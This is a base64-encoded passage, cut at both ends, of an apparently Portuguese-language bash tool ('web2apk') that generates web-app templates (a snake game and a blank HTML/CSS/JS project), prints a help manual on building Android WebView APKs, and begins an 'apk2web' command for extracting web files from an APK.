xlID0gJyNmZmYnOwogICAgY3R4LmZvbnQgPSAnYm9sZCAyNHB4IHN5c3RlbS11aSc7CiAgICBjdHgudGV4dEFsaWduID0gJ2NlbnRlcic7CiAgICBjdHguZmlsbFRleHQoJ0dhbWUgT3ZlcicsIDE1MCwgMTM1KTsKICAgIGN0eC5mb250ID0gJzE2cHggc3lzdGVtLXVpJzsKICAgIGN0eC5maWxsVGV4dCgnVG9xdWUgcGFyYSByZWluaWNpYXInLCAxNTAsIDE2NSk7CiAgICByZXR1cm47CiAgfQogIHNuYWtlLnVuc2hpZnQoaGVhZCk7CiAgaWYgKGhlYWQueCA9PT0gZm9vZC54ICYmIGhlYWQueSA9PT0gZm9vZC55KSB7CiAgICBzY29yZSsrOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQgPSAnUG9udG9zOiAnICsgc2NvcmU7CiAgICBmb29kID0gcm5kRm9vZCgpOwogIH0gZWxzZSB7IHNuYWtlLnBvcCgpOyB9CiAgZHJhdygpOwp9CgpmdW5jdGlvbiBkcmF3KCkgewogIGN0eC5maWxsU3R5bGUgPSAnIzBmMTExNyc7IGN0eC5maWxsUmVjdCgwLDAsMzAwLDMwMCk7CiAgY3R4LmZpbGxTdHlsZSA9ICcjMWE3M2U4JzsKICBzbmFrZS5mb3JFYWNoKChzLGkpID0+IHsKICAgIGN0eC5nbG9iYWxBbHBoYSA9IGkgPT09IDAgPyAxIDogMC43OwogICAgcm91bmRSZWN0KHMueCpTWisxLCBzLnkqU1orMSwgU1otMiwgU1otMiwgMyk7CiAgfSk7CiAgY3R4Lmdsb2JhbEFscGhhID0gMTsKICBjdHguZmlsbFN0eWxlID0gJyNlNTM5MzUnOwogIHJvdW5kUmVjdChmb29kLngqU1orMSwgZm9vZC55KlNaKzEsIFNaLTIsIFNaLTIsIDMpOwp9CgpmdW5jdGlvbiByb3VuZFJlY3QoeCx5LHcsaCxyKSB7CiAgY3R4LmJlZ2luUGF0aCgpOwogIGN0eC5yb3VuZFJlY3QoeCx5LHcsaCxyKTsKICBjdHguZmlsbCgpOwp9Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZSA9PiB7CiAgY29uc3QgbWFwID0ge0Fycm93VXA6e3g6MCx5Oi0xfSxBcnJvd0Rvd246e3g6MCx5OjF9LEFycm93TGVmdDp7eDotMSx5OjB9LEFycm93UmlnaHQ6e3g6MSx5OjB9fTsKICBpZiAobWFwW2Uua2V5XSAmJiAhKG1hcFtlLmtleV0ueD09PS1kaXIueCAmJiBtYXBbZS5rZXldLnk9PT0tZGlyLnkpKSBkaXIgPSBtYXBbZS5rZXldOwp9KTsKCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNkcGFkIGJ1dHRvbicpLmZvckVhY2goYnRuID0+IHsKICBidG4uYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hzdGFydCcsIGUgPT4gewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKCFydW5uaW5nKSB7IGluaXQoKTsgcmV0dXJuOyB9CiAgICBjb25zdCBtYXAgPSB7VVA6e3g6MCx5Oi0xfSxET1dOOnt4OjAseToxfSxMRUZUOnt4Oi0xLHk6MH0sUklHSFQ6e3g6MSx5OjB9fTsKICAgIGNvbnN0IGQgPSBtYXBbYnRuLmRhdGFzZXQuZF07CiAgICBpZiAoZCAmJiAhKGQueD09PS1kaXIueCAmJiBkLnk9PT0tZGlyLnkpKSBkaXIgPSBkOwogIH0pOwp9KTsKCmNhbnZhcy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgaWYgKCFydW5uaW5nKSBpbml0KCk7IH0pOwppbml0KCk7CkpTCn0KCiMg4pSA4pSAIGJsYW5rIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfdHBsX2JsYW5rKCkgewogIGxvY2FsIEQ9IiQxIgogIGNhdCA+ICIkRC9pbmRleC5odG1sIiA8PCAnSFRNTCcKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InB0LUJSIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj4KICA8dGl0bGU+TWV1IEFwcDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzdHlsZS5jc3MiPgo8L2hlYWQ+Cjxib2R5PgoKICA8IS0tIFNldSBjb250ZcO6ZG8gYXF1aSAtLT4KCiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCgogIGNhdCA+ICIkRC9zdHlsZS5jc3MiIDw8ICdDU1MnCi8qIFJlc2V0ICovCiogeyBib3gtc2l6aW5nOiBib3JkZXItYm94OyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7IH0KCmJvZHkgewogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgYmFja2dyb3VuZDogI2ZmZmZmZjsKICBjb2xvcjogIzExMTExMTsKICBtaW4taGVpZ2h0OiAxMDB2aDsKfQpDU1MKCiAgcHJpbnRmICcvLyBzY3JpcHQuanNcbiJ1c2Ugc3RyaWN0IjtcblxuLy8gU2V1IGPDs2RpZ28gYXF1aVxuJyA+ICIkRC9zY3JpcHQuanMiCn0KCgpfY21kX21hbigpIHsKICBsb2NhbCBSPSdcMDMzWzE7MzFtJyBHPSdcMDMzWzE7MzJtJyBZPSdcMDMzWzE7MzNtJwogIGxvY2FsIEM9J1wwMzNbMTszNm0nIFc9J1wwMzNbMTszN20nIEQ9J1wwMzNbMDs5MG0nIE49J1wwMzNbMG0nCiAgcHJpbnRmICJcbiR7V33ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcke059XG4iCiAgcHJpbnRmICIke1d94pWRICAgICAgICB3ZWIyYXBrIOKAlCBNYW51YWw6IE8gcXVlIGNhZGEgYXJxdWl2byBkZXZlIHRlciAgICAgICAgIOKVkSR7Tn1cbiIKICBwcmludGYgIiR7V33ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0ke059XG5cbiIKCiAgcHJpbnRmICIke1l9RVNUUlVUVVJBIE3DjU5JTUEgRE8gUFJPSkVUTyR7Tn1cbiIKICBwcmludGYgIiR7RH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAke059XG4iCiAgcHJpbnRmICIgICR7WX0uL21ldWFwcC8ke059XG4iCiAgcHJpbnRmICIgICR7WX3ilJzilIDilIAgaW5kZXguaHRtbCR7Tn0gICAke0R94oaQIHBvbnRvIGRlIGVudHJhZGEgb2JyaWdhdMOzcmlvJHtOfVxuIgogIHByaW50ZiAiICAke1l94pSc4pSA4pSAIHN0eWxlLmNzcyR7Tn0gICAgJHtEfeKGkCBlc3RpbG9zIG9icmlnYXTDs3Jpb3Mke059XG4iCiAgcHJpbnRmICIgICR7WX3ilJTilIDilIAgc2NyaXB0LmpzJHtOfSAgICAke0R94oaQIGzDs2dpY2Egb2JyaWdhdMOzcmlhJHtOfVxuXG4iCgogICMg4pSA4pSAIGluZGV4Lmh0bWwg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICIke0N94pSB4pSB4pSBICBpbmRleC5odG1sICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEke059XG5cbiIKICBwcmludGYgIiAgJHtXfU9CUklHQVTDk1JJTzoke059XG4iCiAgcHJpbnRmICIgICR7R33inJMke059IFByaW1laXJhIGxpbmhhOiAke0R9PCFET0NUWVBFIGh0bWw+JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBObyA8aGVhZD46ICR7RH08bWV0YSBjaGFyc2V0PVwiVVRGLThcIj4ke059XG4iCiAgcHJpbnRmICIgICR7R33inJMke059IE5vIDxoZWFkPjogJHtEfTxtZXRhIG5hbWU9XCJ2aWV3cG9ydFwiIGNvbnRlbnQ9XCJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wXCI+JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBObyA8aGVhZD46ICR7RH08bGluayByZWw9XCJzdHlsZXNoZWV0XCIgaHJlZj1cInN0eWxlLmNzc1wiPiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gQW50ZXMgZGUgPC9ib2R5PjogJHtEfTxzY3JpcHQgc3JjPVwic2NyaXB0LmpzXCI+PC9zY3JpcHQ+JHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31BVEVOw4fDg08g4oCUIHZpZXdwb3J0OiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfVNlbSBlc3NhIHRhZyBvIEFQSyByZW5kZXJpemEgZW0gbW9kbyBkZXNrdG9wIGUgZmljYSBtaW7DunNjdWxvLiR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9QVRFTsOHw4NPIOKAlCBwb3Npw6fDo28gZG8gPHNjcmlwdD46JHtOfVxuIgogIHByaW50ZiAiICAke0R9Q29sb3F1ZSBTRU1QUkUgYW50ZXMgZGUgPC9ib2R5PiwgbnVuY2Egbm8gPGhlYWQ+LiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfVNlIGNvbG9jYXIgbm8gPGhlYWQ+LCBvIEpTIHJvZGEgYW50ZXMgZG9zIGVsZW1lbnRvcyBleGlzdGlyZW0uJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31DQU1JTkhPUyBERSBBUlFVSVZPUzoke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH08aW1nIHNyYz1cIi9ob21lL3VzZXIvZm90by5wbmdcIj4gIOKGkCBjYW1pbmhvIGFic29sdXRvLCBOw4NPIGZ1bmNpb25hJHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSAke0R9PGltZyBzcmM9XCJmb3RvLnBuZ1wiPiAgICAgICAgICAgICDihpAgY2FtaW5obyByZWxhdGl2bywgY29ycmV0byR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9RVhFTVBMTyBNw41OSU1PIFbDgUxJRE86JHtOfVxuIgogIHByaW50ZiAiJHtEfSAgPCFET0NUWVBFIGh0bWw+XG4iCiAgcHJpbnRmICIgIDxodG1sIGxhbmc9XCJwdC1CUlwiPlxuIgogIHByaW50ZiAiICA8aGVhZD5cbiIKICBwcmludGYgIiAgICA8bWV0YSBjaGFyc2V0PVwiVVRGLThcIj5cbiIKICBwcmludGYgIiAgICA8bWV0YSBuYW1lPVwidmlld3BvcnRcIiBjb250ZW50PVwid2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMFwiPlxuIgogIHByaW50ZiAiICAgIDx0aXRsZT5NZXUgQXBwPC90aXRsZT5cbiIKICBwcmludGYgIiAgICA8bGluayByZWw9XCJzdHlsZXNoZWV0XCIgaHJlZj1cInN0eWxlLmNzc1wiPlxuIgogIHByaW50ZiAiICA8L2hlYWQ+XG4iCiAgcHJpbnRmICIgIDxib2R5PlxuIgogIHByaW50ZiAiICAgIDxoMT5PbMOhITwvaDE+XG4iCiAgcHJpbnRmICIgICAgPHNjcmlwdCBzcmM9XCJzY3JpcHQuanNcIj48L3NjcmlwdD5cbiIKICBwcmludGYgIiAgPC9ib2R5PlxuIgogIHByaW50ZiAiICA8L2h0bWw+XG4ke059XG4iCgogICMg4pSA4pSAIHN0eWxlLmNzcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIiR7Q33ilIHilIHilIEgIHN0eWxlLmNzcyAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31PQlJJR0FUw5NSSU86JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBSZXNldCBkZSBtYXJnZW06ICR7RH0qIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBib3gtc2l6aW5nOiBib3JkZXItYm94OyB9JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBUYW1hbmhvIGJhc2U6ICR7RH1ib2R5IHsgd2lkdGg6IDEwMHZ3OyBtaW4taGVpZ2h0OiAxMDB2aDsgfSR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9UkVDT01FTkRBRE8gcGFyYSBBbmRyb2lkOiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gRm9udGVzIGVtICR7RH1yZW0ke059IG91ICR7RH12dyR7Tn0sIG7Do28gZW0gJHtEfXB4JHtOfSBmaXhvXG4iCiAgcHJpbnRmICIgICR7R33inJMke059IEJvdMO1ZXMgY29tIG3DrW5pbW8gZGUgJHtEfTQ4cHgke059IGRlIGFsdHVyYSAow6FyZWEgdG9jw6F2ZWwpXG4iCiAgcHJpbnRmICIgICR7R33inJMke059ICR7RH1vdmVyZmxvdy14OiBoaWRkZW4ke059IG5vIGJvZHkgcGFyYSBldml0YXIgc2Nyb2xsIGxhdGVyYWxcblxuIgogIHByaW50ZiAiICAke1d9RVZJVEU6JHtOfVxuIgogIHByaW50ZiAiICAke1J94pyXJHtOfSAke0R9QGltcG9ydCB1cmwoaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS8uLi4pJHtOfSAg4oaQIHNlbSBpbnRlcm5ldCBubyBBUEtcbiIKICBwcmludGYgIiAgJHtSfeKclyR7Tn0gSW1hZ2VucyBkZSBmdW5kbyB2aWEgVVJMIGV4dGVybmFcbiIKICBwcmludGYgIiAgJHtSfeKclyR7Tn0gJHtEfXBvc2l0aW9uOiBmaXhlZCR7Tn0gY29tIGRpbWVuc8O1ZXMgaGFyZGNvZGVkXG5cbiIKICBwcmludGYgIiAgJHtXfUZPTlRFUyBMT0NBSVMgKGNvcnJldG8pOiR7Tn1cbiIKICBwcmludGYgIiR7RH0gIEBmb250LWZhY2Uge1xuIgogIHByaW50ZiAiICAgIGZvbnQtZmFtaWx5OiAnTWluaGFGb250ZSc7XG4iCiAgcHJpbnRmICIgICAgc3JjOiB1cmwoJ21pbmhhLWZvbnRlLnR0ZicpO1xuIgogIHByaW50ZiAiICB9XG4ke059XG4iCgogICMg4pSA4pSAIHNjcmlwdC5qcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIiR7Q33ilIHilIHilIEgIHNjcmlwdC5qcyAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31PQlJJR0FUw5NSSU86JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBTZSBvIDxzY3JpcHQ+IGZvciBubyA8aGVhZD4sIGVudm9sdmEgdHVkbyBjb206XG4iCiAgcHJpbnRmICIke0R9ICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7XG4iCiAgcHJpbnRmICIgICAgLy8gc2V1IGPDs2RpZ28gYXF1aVxuIgogIHByaW50ZiAiICB9KTtcbiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfShTZSBvIDxzY3JpcHQ+IGVzdGl2ZXIgYW50ZXMgZGUgPC9ib2R5PiwgaXNzbyBuw6NvIMOpIG5lY2Vzc8OhcmlvLikke059XG5cbiIKICBwcmludGYgIiAgJHtXfU8gUVVFIEZVTkNJT05BIG5vIFdlYlZpZXcgZG8gQVBLOiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gTWFuaXB1bGHDp8OjbyBkZSBET00sIGV2ZW50b3MsIGFuaW1hw6fDtWVzIENTU1xuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBDYW52YXMgMkQgZSBXZWJHTCBiw6FzaWNvXG4iCiAgcHJpbnRmICIgICR7R33inJMke059ICR7RH1uZXcgQXVkaW8oJ2FycXVpdm8ubXAzJykke059IOKAlCBzZSBvIC5tcDMgZXN0aXZlciBuYSBwYXN0YVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSAke0R9c2Vzc2lvblN0b3JhZ2Uke059IGUgdmFyacOhdmVpcyBnbG9iYWlzIEpTXG4iCiAgcHJpbnRmICIgICR7R33inJMke059IEJpYmxpb3RlY2FzIEpTIGxvY2FpcyAoYXJxdWl2byAuanMgbmEgcGFzdGEsIGltcG9ydGFkbyByZWxhdGl2bylcblxuIgogIHByaW50ZiAiICAke1d9TyBRVUUgTsODTyBGVU5DSU9OQToke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH1mZXRjaCgnaHR0cHM6Ly9hcGkuZXh0ZXJuYS5jb20nKSR7Tn0gIOKGkCBDT1JTIGJsb3F1ZWFkbyBubyBXZWJWaWV3XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH1uYXZpZ2F0b3IuZ2VvbG9jYXRpb24ke059ICAgICAgICAgICAgICDihpAgcHJlY2lzYSBkZSBwZXJtaXNzw6NvIG5hdGl2YVxuIgogIHByaW50ZiAiICAke1J94pyXJHtOfSAke0R9PHNjcmlwdCBzcmM9XCJodHRwczovL2Nkbi5leGVtcGxvLmNvbS9saWIuanNcIj4ke059ICDihpAgc2VtIGludGVybmV0XG5cbiIKICBwcmludGYgIiAgJHtXfUJJQkxJT1RFQ0FTIEVYVEVSTkFTIOKAlCBmYcOnYSBhc3NpbToke059XG4iCiAgcHJpbnRmICIgICR7RH1CYWl4ZSBvIC5qcyBlIGNvbG9xdWUgbmEgcGFzdGEgZG8gcHJvamV0bzoke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH08c2NyaXB0IHNyYz1cImh0dHBzOi8vY2RuLmpxdWVyeS5jb20vanF1ZXJ5Lm1pbi5qc1wiPiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gJHtEfTxzY3JpcHQgc3JjPVwianF1ZXJ5Lm1pbi5qc1wiPiR7Tn1cblxuIgoKICAjIOKUgOKUgCBBcnF1aXZvcyBleHRyYXMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICIke0N94pSB4pSB4pSBICBBUlFVSVZPUyBPUENJT05BSVMgIOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9SW1hZ2Vuczoke059ICAucG5nIC5qcGcgLmdpZiAud2VicCAuc3ZnXG4iCiAgcHJpbnRmICIgICR7V33DgXVkaW86JHtOfSAgICAubXAzIC5vZ2cgLndhdlxuIgogIHByaW50ZiAiICAke1d9Rm9udGVzOiR7Tn0gICAudHRmIC53b2ZmIC53b2ZmMiAgJHtEfSh1c2UgQGZvbnQtZmFjZSBsb2NhbCkke059XG4iCiAgcHJpbnRmICIgICR7V31KU09OOiR7Tn0gICAgIC5qc29uICAke0R9KHZpYSBmZXRjaCgnLi9kYWRvcy5qc29uJykpJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31TdWJwYXN0YXMgZnVuY2lvbmFtIG5vcm1hbG1lbnRlOiR7Tn1cbiIKICBwcmludGYgIiAgJHtZfSAgLi9tZXVhcHAvYXNzZXRzL2xvZ28ucG5nJHtOfSAg4oaSICAke0R9PGltZyBzcmM9XCJhc3NldHMvbG9nby5wbmdcIj4ke059XG5cbiIKCiAgIyDilIDilIAgRXJyb3MgY29tdW5zIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIHByaW50ZiAiJHtDfeKUgeKUgeKUgSAgRVJST1MgQ09NVU5TICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEke059XG5cbiIKICBwcmludGYgIiAgJHtSfVRlbGEgYnJhbmNhIG5vIEFQSyR7Tn1cbiIKICBwcmludGYgIiAgJHtEfeKGkiBWZXJpZmlxdWUgc2UgbyA8c2NyaXB0PiBlc3TDoSBhbnRlcyBkZSA8L2JvZHk+JHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEFicmEgbyBpbmRleC5odG1sIG5vIGJyb3dzZXIgZSB2ZWphIG8gY29uc29sZSBkZSBlcnJvcyR7Tn1cblxuIgogIHByaW50ZiAiICAke1J9TGF5b3V0IHF1ZWJyYWRvIC8gdGVsYSBtaW7DunNjdWxhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEZhbHRvdSBhIG1ldGEgdmlld3BvcnQgbm8gPGhlYWQ+JHtOfVxuXG4iCiAgcHJpbnRmICIgICR7Un1JbWFnZW5zIG7Do28gYXBhcmVjZW0ke059XG4iCiAgcHJpbnRmICIgICR7RH3ihpIgVXNlIGNhbWluaG8gcmVsYXRpdm8gZSBjb25maXJtZSBxdWUgbyBhcnF1aXZvIGVzdMOhIG5hIHBhc3RhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIE5vbWVzIGRlIGFycXVpdm8gc8OjbyBjYXNlLXNlbnNpdGl2ZSBubyBBbmRyb2lkJHtOfVxuIgogIHByaW50ZiAiICAke0R9ICBleDogJ0xvZ28uUE5HJyDiiaAgJ2xvZ28ucG5nJyR7Tn1cblxuIgogIHByaW50ZiAiICAke1J9Rm9udGUgbsOjbyBjYXJyZWdhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEJhaXhlIG8gLnR0ZiBlIHVzZSBAZm9udC1mYWNlIGxvY2FsIChzZW0gR29vZ2xlIEZvbnRzIG9ubGluZSkke059XG5cbiIKICBwcmludGYgIiR7RH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAke059XG4iCiAgcHJpbnRmICIgIETDunZpZGFzIHNvYnJlIG9ww6fDtWVzIGRvIGNvbWFuZG8/ICAke1d9d2ViMmFwayBoZWxwJHtOfVxuIgogIHByaW50ZiAiJHtEfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCR7Tn1cblxuIgp9CiMg4pSA4pSAIGFwazJ3ZWIg4oCUIGV4dHJhaSBhcnF1aXZvcyB3ZWIgZGUgdW0gQVBLIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfY21kX2FwazJ3ZWIoKSB7CiAgbG9jYWwgQVBLX0ZJTEU9JycgT1VUX0RJUj0nJyBGT1JDRT0wCgogICMgUGFyc2VhciBhcmd1bWVudG9zCiAgd2hpbGUgWyAkIyAtZ3QgMCBdOyBkbwogICAgY2FzZSAiJDEiIGluCiAgICAgIC0tZm9yY2V8LWYpIEZPUkNFPTE7IHNoaWZ0IDs7CiAgICAgIC0tb3V0KSAgICAgIE9VVF9ESVI9IiQyIjsgc2hpZnQgMiA7OwogICAgICAtLSopICAgICAgICBfd2FybiAiT3BjYW8gZGVzY29uaGVjaWRhOiAkMSI7IHNoaWZ0IDs7CiAgICAgICopCiAgICAgICAgaWYgWyAteiAiJEFQS19GSUxFIiBdOyB0aGVuCiAgICAgICAgICBBUEtfRklMRT0iJDEiCiAgICAgICAgZWxpZiBbIC16ICIkT1VUX0RJUiIgXTsgdGhlbgogICAgICAgICAgT1VUX0RJUj0iJDEiCiAgICAgICAgZmkKICAgICAgICBzaGlmdCA7OwogICAgZXNhYwogIGRvbmUKCiAgIyBWYWxpZGFjb2VzCiAgWyAteiAiJEFQS19GSUxFIiBdICYmIHsgX2NtZF9oZWxwOyBleGl0IDE7IH0KICBbIC1mICIkQVBLX0ZJTEUiIF0gfHwgX2VyciAiQXJxdWl2byBBUEsgbmFvIGVuY29udHJhZG86ICRBUEtfRklMRSIKCiAgIyBWZXJpZmljYXIgc2UgZSB1bSBhcnF1aXZvIFpJUC9BUEsgdmFsaWRvCiAgcHl0aG9uMyAtYyAiaW1wb3J0IHppcGZpbGU7IHppcGZpbGUuWmlwRmlsZSgnJEFQS19GSUxFJykiIDI+L2Rldi9udWxsIFwKICAgIHx8IF9lcnIgIkFycXVpdm8gaW52YWxpZG8gb3UgY29ycm9tcGlkbyAobmFvIGUgdW0gQVBLL1pJUCk6ICRBUEtfRklMRSIKCiAgIyBEaXJldG9yaW8gZGUgc2FpZGEgcGFkcmFvCiAgaWYgWyAteiAiJE9VVF9ESVIiIF07IHRoZW4KICAgIGxvY2FsIF9iYXNlOyBfYmF